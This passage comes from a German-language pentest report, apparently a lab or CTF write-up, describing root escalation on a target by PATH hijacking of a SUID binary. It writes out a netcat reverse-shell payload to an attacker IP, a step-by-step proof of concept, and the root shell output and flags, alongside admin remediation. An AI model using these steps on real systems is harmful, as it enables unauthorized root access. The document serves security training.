+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `check` aus, um zu sehen, was es tut. Analysieren Sie die Datei mit `strings check` oder `ltrace check` / `strace check`, um herauszufinden, welche anderen Programme oder Dateien sie aufruft. Suchen Sie nach Möglichkeiten, das Verhalten von `check` zu beeinflussen, insbesondere wenn es andere Befehle ohne absoluten Pfad aufruft (PATH-Manipulation).<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie den Zweck und die Notwendigkeit dieser SUID/SGID-Datei. Wenn möglich, entfernen Sie die SUID/SGID-Bits (`chmod u-s,g-s /opt/check`) oder ersetzen Sie die Funktionalität durch eine sicherere Methode (z.B. spezifische `sudo`-Regel).</p>
+
+              <div class="code-block">
+                  <div class="terminal">
+                      <pre><span class="prompt">user3@sedem:/opt$</span> <span class="command">strings check</span></pre>
+                      <pre>
+[...]
+<span class="command">service apache2 status</span>
+[...]
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Befehl `strings check` extrahiert lesbare Zeichenketten aus der Binärdatei. Eine auffällige Zeichenkette ist `service apache2 status`. Dies deutet stark darauf hin, dass das `check`-Programm den Befehl `service` verwendet, um den Status des Apache-Dienstes zu überprüfen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Schlüsselinformation!** Wenn `check` (das als Root läuft) den Befehl `service` ohne absoluten Pfad aufruft (also nur `service` statt `/usr/sbin/service`), dann ist dies anfällig für PATH-Manipulation. Der Benutzer `user3` kann ein eigenes Verzeichnis erstellen, eine schädliche Datei namens `service` darin platzieren, dieses Verzeichnis an den Anfang der `PATH`-Umgebungsvariable setzen und dann `/opt/check` ausführen. Das `check`-Programm wird dann die schädliche `service`-Datei als Root ausführen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Implementieren Sie den PATH-Hijacking-Angriff:
+                  1. Erstellen Sie ein Skript in einem beschreibbaren Verzeichnis (z.B. `/tmp` oder Home von `user3`) namens `service`.
+                  2. Machen Sie das Skript ausführbar (`chmod +x service`).
+                  3. Fügen Sie Code in das Skript ein, der Root-Rechte ausnutzt (z.B. eine Reverse Shell, `/bin/bash` kopieren und SUID setzen).
+                  4. Fügen Sie das Verzeichnis mit dem schädlichen Skript an den Anfang des `PATH` (`export PATH=/tmp:$PATH`).
+                  5. Führen Sie `/opt/check` aus.<br/>
+              <strong>Empfehlung (Admin):</strong> Ändern Sie das `check`-Programm so, dass es absolute Pfade verwendet (z.B. `/usr/sbin/service apache2 status`). Entfernen Sie die SUID/SGID-Bits, wenn die Funktionalität anders realisiert werden kann.</p>
+
+              <p class="analysis"><strong>Analyse:</strong> Die nächsten Schritte im Originaltext beschreiben genau diesen PATH-Hijacking-Angriff.</p>
+
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvp 1234</span></div> <!-- Port 1234 scheint ein Fehler zu sein, später wird 5555 verwendet -->
+                       <pre>listening on [any] 1234 ...</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Ein Listener wird auf Port 1234 gestartet. (Hinweis: Im späteren Verlauf wird Port 5555 verwendet, es liegt wahrscheinlich ein Tippfehler vor. Ich gehe von Port 5555 aus.)</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">user3@sedem:/home/user1$</span> <span class="command">cd /tmp; echo 'nc 192.168.2.140 5555 -e "/bin/bash"' > service; chmod +x service</span></pre> <!-- Port korrigiert auf 5555 basierend auf späterem Listener -->
+                   </div>
+               </div>
+               <p class="analysis"><strong>Analyse:</strong> Als `user3` wird ins `/tmp`-Verzeichnis gewechselt. Dort wird eine Datei namens `service` erstellt. Der Inhalt dieser Datei ist ein Befehl, der eine Netcat-Reverse-Shell zur Angreifer-IP `192.168.2.140` auf Port `5555` startet. Die Datei wird anschließend ausführbar gemacht (`chmod +x service`).</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Das schädliche `service`-Skript ist vorbereitet.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">user3@sedem:/tmp$</span> <span class="command">export PATH=/tmp:$PATH</span></pre>
+                   </div>
+               </div>
+               <p class="analysis"><strong>Analyse:</strong> Das Verzeichnis `/tmp` wird an den Anfang der `PATH`-Umgebungsvariable gesetzt. Wenn nun ein Programm nach einem Befehl sucht (wie `check` nach `service`), wird zuerst in `/tmp` gesucht, bevor die Standard-Systempfade durchsucht werden.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> Die Umgebung ist für den PATH-Hijacking vorbereitet.</p>
+
+        </section>
+
+        <!-- Proof of Concept Abschnitt für Root -->
+        <section id="poc-root">
+            <h2>Proof of Concept: Root Exploit (PATH Hijacking)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Das SUID/SGID-Root-Programm `/opt/check` ruft den Befehl `service` ohne absoluten Pfad auf, um den Status von Apache zu prüfen. Dies ermöglicht einem Angreifer (hier `user3`), die `PATH`-Umgebungsvariable zu manipulieren und eine eigene, schädliche ausführbare Datei namens `service` in einem Verzeichnis am Anfang des `PATH` (z.B. `/tmp`) zu platzieren. Wenn `/opt/check` ausgeführt wird, führt es die schädliche `service`-Datei mit Root-Rechten aus.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Zugriff als `user3` (oder ein anderer Benutzer, der `/opt/check` ausführen kann), Schreibzugriff auf ein Verzeichnis (z.B. `/tmp`), SUID/SGID-Root-Binary `/opt/check`, das `service` ohne absoluten Pfad aufruft.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Listener auf der Angreifer-Maschine starten (z.B. `nc -lvnp 5555`).
+                2. Auf dem Zielsystem als `user3`: `cd /tmp`
+                3. Auf dem Zielsystem: `echo 'nc 192.168.2.140 5555 -e "/bin/bash"' > service`
+                4. Auf dem Zielsystem: `chmod +x service`
+                5. Auf dem Zielsystem: `export PATH=/tmp:$PATH`
+                6. Auf dem Zielsystem: `/opt/check` ausführen.
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Das `/opt/check`-Programm führt `/tmp/service` als Root aus. `/tmp/service` startet eine Reverse Shell zum Listener des Angreifers. Der Angreifer erhält eine Root-Shell.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">user3@sedem:/tmp$</span> <span class="command">/opt/check</span></pre>
+                      <pre><!-- Keine direkte Ausgabe hier, da der Befehl die Reverse Shell startet --> </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `user3` führt nun `/opt/check` aus. Da `/tmp` im `PATH` vorne steht, findet das Programm die schädliche `/tmp/service`-Datei und führt sie als Root aus. Diese startet die Netcat-Reverse-Shell zum Angreifer.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Auslöser des Exploits.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                      <pre>
+listening on [any] 5555 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.138] 33868</span> <!-- IP des Ziels hier wieder .138, sollte .107 sein -->
+<span class="command">id</span>
+<span class="command">uid=0(root) gid=0(root) groups=0(root),1002(user3)</span>
+<span class="command">cd /root</span>
+<span class="prompt">#</span> <span class="command">ls</span>
+<span class="command">root.txt</span>
+<span class="prompt">#</span> <span class="command">cat root.txt</span>
+<span class="password">Thicolgim</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener des Angreifers empfängt die Verbindung. Der Angreifer führt `id` aus, was `uid=0(root)` bestätigt – Root-Zugriff wurde erlangt! Anschließend wechselt der Angreifer ins `/root`-Verzeichnis, listet den Inhalt auf und liest die Root-Flag aus `root.txt`.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Fantastisch, Root-Zugriff erreicht!** Der PATH-Hijacking-Angriff war erfolgreich. Die Root-Flag lautet `<span class="password">Thicolgim</span>`.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ziel erreicht. Bericht abschließen.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie die PATH-Hijacking-Schwachstelle in `/opt/check`, indem Sie absolute Pfade verwenden oder die SUID/SGID-Bits entfernen. Überprüfen Sie das System auf weitere Instanzen unsicherer Pfadverwendung in privilegierten Skripten oder Programmen.</p>
+
+        </section>
+
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /srv/ftp/user.txt</div>
+                     <div class="flag-value"><span class="password">Hegumlam</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">Thicolgim</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 1. Oktober 2022</p>
+    </footer>
+</body>
+</html>
